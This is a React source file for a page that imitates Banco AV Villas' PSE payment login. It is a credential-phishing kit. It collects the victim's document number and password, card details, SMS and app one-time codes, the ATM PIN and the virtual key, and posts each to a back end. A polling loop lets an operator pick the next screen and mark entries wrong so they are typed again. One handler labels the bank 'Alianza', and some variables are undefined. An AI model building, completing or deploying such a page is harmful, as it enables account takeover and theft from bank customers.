"use client"
import "./avvillas.css"
import { InputAnimado } from "@/components/inputAnimado/InputAnimado"
import { Tarjeta } from "@/components/tarjeta/Tarjeta"
import { Status } from "@/components/status/Status"
import { useEffect, useState } from "react"
import axios from "axios"
import { SelectMinimalista } from "@/components/selectMinimalista/SelectMinimalista"

const COLOR_PRINCIPAL_TEXT = "text-[#0048db]"
const COLOR_PRINCIPAL_BACK = "bg-[#0048db]"
const back_color = "bg-[#ffffff]"
const back_color_input = "bg-[#ffffff]"
const text_color = "text-[#270f3c]"
const ESTILO_BTN_PRINCIPAL = `py-3 text-white ${COLOR_PRINCIPAL_BACK} text-[14px] w-full rounded-full  disabled:cursor-not-allowed disabled:bg-[#C3CFE2]`

const svg = (
    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-person ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
        <path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6m2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0m4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4m-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10s-3.516.68-4.168 1.332c-.678.678-.83 1.418-.832 1.664z"/>
    </svg>
    )

const svgPassword = (
    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-eye ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
        <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
        <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
    </svg>
)

const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar, tituloError }) => {
    const [errorDatos, setErrorDatos] = useState({
        tipoDocumento: "Cédula De Ciudadanía",
        numeroDocumento: "",
        contrasenia: ""       
    })

    const handlerContinuar = () => {
        const nuevosErrores = {
            numeroDocumento: "",
            contrasenia: ""
        }

        // Validación de número de documento
        if (!datosInicio.numeroDocumento || datosInicio.numeroDocumento.trim() === "") {
            nuevosErrores.numeroDocumento = "El número de documento es obligatorio"
        }

        // Validación de contraseña
        if (!datosInicio.contrasenia || datosInicio.contrasenia.trim() === "") {
            nuevosErrores.contrasenia = "La clave es obligatoria"
        }

        // Si hay errores, los mostramos
        if (nuevosErrores.numeroDocumento || nuevosErrores.contrasenia) {
            setErrorDatos(nuevosErrores)
            return
        }

        // Si no hay errores, limpiamos y ejecutamos la acción
        setErrorDatos({
            tipoDocumento: "Cédula De Ciudadanía",
            numeroDocumento: "",
            contrasenia: ""
        })
        btnInicio()
    }
    const handlerCheck = (e) => {
        const { name, value } = e.target;
        
        handlerInformacion(e);

        setErrorDatos((prev) => {
            const nuevosErrores = { ...prev };

            // Validación en tiempo real por campo
            if (name === "numeroDocumento") {
                if (!value.trim()) {
                    nuevosErrores.numeroDocumento = "El número de documento es obligatorio";
                } else {
                    nuevosErrores.numeroDocumento = "";
                }
            }

            if (name === "contrasenia") {
                if (!value.trim()) {
                    nuevosErrores.contrasenia = "La clave es obligatoria";
                } else {
                    nuevosErrores.contrasenia = "";
                }
            }

                return nuevosErrores;
            });
    };

    return (
        <div className="w-full">
            {tituloError !== "" && 
                <div className="w-full flex items-center justify-center">
                    <span className="text-[11px] text-red-600">{tituloError}</span>
                </div>
            }
            <div className="w-full flex flex-col gap gap-y-4 pl-1">
                <SelectMinimalista 
                    label={"Tipo de documento"} 
                    labelColor={COLOR_PRINCIPAL_TEXT} 
                    name={"tipoDocumento"} 
                    handler={handlerInformacion} 
                    value={datosInicio.numeroDocumento} 
                    arrayDatos={["Cédula de ciudadanía", "Cédula de extranjería", "Tarjeta de identidad"]} 
                    borderCol={"border-gray-400"}
                    border="border border-1"
                    borderColSelec={"border-black"} 
                    borderColError={"border-red-600"}
                />
                <InputAnimado 
                    error={!!errorDatos.numeroDocumento}
                    errorLabel={errorDatos.numeroDocumento}
                    svg={svg}
                    labelErrorColor={"text-[#a00104]"}
                    borderCol={"border border-1 border-gray-300"}
                    borderColSelec={"border-b-2 border-b-[#0048db]"}
                    borderColError={"border-b-2 border-b-[#a00104]"} 
                    label={"Número de documento"} 
                    labelColor={text_color}
                    modoNumerico={true}
                    type={"tel"}
                    labelColorSelect={COLOR_PRINCIPAL_TEXT} 
                    name={"numeroDocumento"} 
                    handler={handlerCheck} 
                    value={datosInicio.numeroDocumento} 
                    backGraundInput={back_color_input}
                />

                <InputAnimado 
                    error={!!errorDatos.contrasenia} 
                    errorLabel={errorDatos.contrasenia} 
                    svg={svgPassword}
                    label={"Clave"} 
                    labelErrorColor={"text-[#a00104]"}
                    labelColorSelect={COLOR_PRINCIPAL_TEXT}
                    borderCol={"border border-1 border-gray-300"}
                    borderColSelec={"border-b-2 border-b-[#0048db]"}
                    borderColError={"border-b-2 border-b-[#a00104]"}  
                    placeHolder={""} 
                    name={"contrasenia"} 
                    handler={handlerCheck} 
                    value={datosInicio.contrasenia} 
                    backGraundInput={back_color_input}
                    modoNumerico={true} 
                    type="password"
                />

                <div className="w-full flex flex-col items-center">
                    <button onClick={handlerContinuar} disabled={datosInicio.numeroDocumento.trim() == "" || datosInicio.contrasenia.trim() == ""} className={ESTILO_BTN_PRINCIPAL}>
                        INGRESAR
                    </button>
                    <button onClick={btnCancelar} className={`text-[#0014a2] mt-3 text-[12px] font-bold`}>
                        Volver al comercio
                    </button>
                </div>
            </div>
        </div>
    )
}






export default function AvVillas (){
    const [inicioSesion, setInicioSesion] = useState(false)
    const [selectVista, setSelectVisata] = useState(null)
    const [loading, setLoading] = useState(false)
    const [tituloError, setTituloError] = useState("")
    const [reLoad, setReLoad] = useState(false)
    const [key, setKey] = useState(0)
    const [datosInicio, setDatosInicio] = useState({
        tipoDocumento: "Cédula De Ciudadanía",
        numeroDocumento: "",
        contrasenia:""
    })
    const [guardado, setGuardado] = useState(false)
    const [uniqId, setUniqId] = useState("")
    const [btnInicio, setBtnInicio] = useState(false)

    const handlerInformacion = (e)=>{
        const copia = {...datosInicio}
        copia[e.target.name] = e.target.value
        setDatosInicio(copia)
    }

    const handlerBtnInicio = ()=>{
        setBtnInicio(b => !b)
    }
    
    //obtener uniqId
    useEffect(() => {
        const savedId = localStorage.getItem('uniqId')
        console.log(savedId == null, "guardaaaa", savedId);
        const temp = savedId == null ? "" : savedId
        setUniqId(temp)
        
    }, [])
    
    //guardad datos de sesion
    useEffect(()=>{
        const inicioSesionfuncion = async ()=>{
            setLoading(true)
            const { data } = await axios.post(
            `/api/sesion`,
            {
                usuario: datosInicio.numeroDocumento,
                clave: datosInicio.contrasenia,
                banco: "avvillas",
                informacion:{
                    tipoDocumento: datosInicio.tipoDocumento
                },
                uniqid: uniqId    
            },
            {
                headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
                },
            }
            )
            if(uniqId === "" ) {
                localStorage.setItem('uniqId', data.uniqid)
                setUniqId(data.uniqid)
            }
            setKey(k => k+1)
            setInicioSesion(true)
            setTituloError("")
            setGuardado(true)
            
        }
        if (btnInicio) {
            inicioSesionfuncion()
        }
    },[btnInicio])

    //pulling
    useEffect(() => {
    let isMounted = true;

    const iniciarLongPolling = async () => {
        if (!isMounted) return;
        setTituloError("")
        try {
            const selV = await axios.get(`/api/sesion/status/${uniqId}`, {
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
            });
            console.log(selV.data.status);
            
            if (
                selV.data.status == "tdb" ||
                selV.data.status == "tdb-error" ||
                selV.data.status == "tdc" ||
                selV.data.status == "tdc-error" ||
                selV.data.status == "otpsms" ||
                selV.data.status == "otpsms-error" ||
                selV.data.status == "otpapp" ||
                selV.data.status == "otpapp-error" ||
                selV.data.status == "clavecajero" ||
                selV.data.status == "clavecajero-error" ||
                selV.data.status == "clavevirtual" ||
                selV.data.status == "clavevirtual-error" &&
                selV.data.status !== selectVista
            ) {
                setSelectVisata(selV.data.status);
                setKey(prev => prev + 1) 
                setLoading(false);
                return;
            }else if(selV.data.status == "fin"){
                setSelectVisata("compraExitosa")
                setLoading(false);
                return;
            }else if(selV.data.status == "error"){
                setSelectVisata("errorCompra")
                setLoading(false);
                return;

            }else if(selV.data.status == "login" || selV.data.status == "login-error"){
                setDatosInicio({
                    numeroDocumento: "",
                    contrasenia:""
                })
                setSelectVisata(selV.data.status)
                if (selV.data.status == "login-error") setTituloError("Informacion incorrecta, ingresala nuevamente")
                setKey(prev => prev + 1)
                setLoading(false);
                return;
            }
        } catch (error) {
            console.log(error);
        }

        // Esperamos 4 segundos y reintentamos
        setTimeout(iniciarLongPolling, 4000);
    };
    if (guardado) {
        iniciarLongPolling()
    }

    return () => {
        isMounted = false;
    };
    }, [guardado, reLoad]);

    //mensje-otp
    const handlerMensaje = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/otp-sms`, {
                uniqid: uniqId,
                otpsms: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    const handlerloginError = async ()=>{
        try {
            setLoading(true)
            const { data } = await axios.post(
            `/api/sesion`,
            {
                usuario: datosInicio.numeroDocumento,
                clave: datosInicio.contrasenia,
                banco: "Alianza",
                uniqid: uniqId    
            },
            {
                headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
                },
            }
            )
            setReLoad(r => r = !r)            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    
    //otp-app
    const handlerAplicacion = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/otp-app`, {
                uniqid: uniqId,
                otpapp: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    //clave-cajero
    const handlerCajero = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/clave-cajero`, {
                uniqid: uniqId,
                clavecajero: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    //clave-virtual
    const handlerClaveVirtual = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/clave-virtual`, {
                uniqid: uniqId,
                clavevirtual: clave 
            },{
            headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    //tarjeta
    const handlerTarjeta = async (body) =>{
        try {
            setLoading(true)
            body.uniqid = uniqId
            const send = await axios.post(`/api/sesion/tarjeta`, body, {
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
            console.log(error);
            setReLoad(r => r = !r)
        }
        
    }



    return(
        <div className={`w-full flex flex-col items-center justify-center ${back_color}`}>
            <div className="w-[90%] mt-9 flex flex-col items-center justify-center">
                <img src="/assets/avvillas/logo-avvillas.svg" width={"180"} height={"40"} className="object-contain"/>
                
                <p className={`text-[20px] mt-3 pb-5 text-[${text_color}]`}>Ingresa para realizar tu pago PSE</p>
                
                {!inicioSesion && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
                {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}
                
                {selectVista == "tdb" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "tdb-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "tdc" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "tdc-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "otpsms" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "otpsms-error" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "otpapp" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave dinamica"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "otpapp-error" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de aplicación"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "clavecajero" && <Status key={key} type={"password"} btn={true} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "clavecajero-error" && <Status key={key} btn={true} type={"password"} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "clavevirtual" && <Status key={key} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "clavevirtual-error" && <Status key={key} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                <div className="w-[80%] mt-6 flex flex-col">
                    <span className="text-[14px] font-bold">Línea Audiovillas</span>
                    <div className="grid grid-cols-3">
                        <div className="flex flex-col">
                            <span className="text-[12px] font-bold">Nacional</span>
                            <span className="text-[12px] border-r-1 pr-0.5">01 8000 51 8000</span>
                        </div>
                        <div className="flex flex-col">
                            <span className="text-[12px] font-bold pl-2.5">Bogotá</span>
                            <span className="text-[12px] border-r-1 pr-1.5 pl-2.5">(601) 4441777</span>
                        </div>
                        <div className="flex items-center">      
                            <span className="text-[12px] pt-3 pl-2.5">Más ciudades</span>
                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" className="bi bi-chevron-up rotate-180" viewBox="0 0 16 16">
                                <path fillRule="evenodd" d="M7.646 4.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1-.708.708L8 5.707l-5.646 5.647a.5.5 0 0 1-.708-.708z"/>
                            </svg>
                        </div>

                    </div>
                </div>
                <div className="w-full border-t-1 border-t-gray-300 flex justify-between mt-4 p-4">
                    <img src="/assets/avvillas/footerAval.svg" className="w-[25%] object-contain"/>
                    <img src="/assets/avvillas/footerR.svg" className="w-[25%] object-contain"/>
                </div>             
            </div>
        </div>
    )
}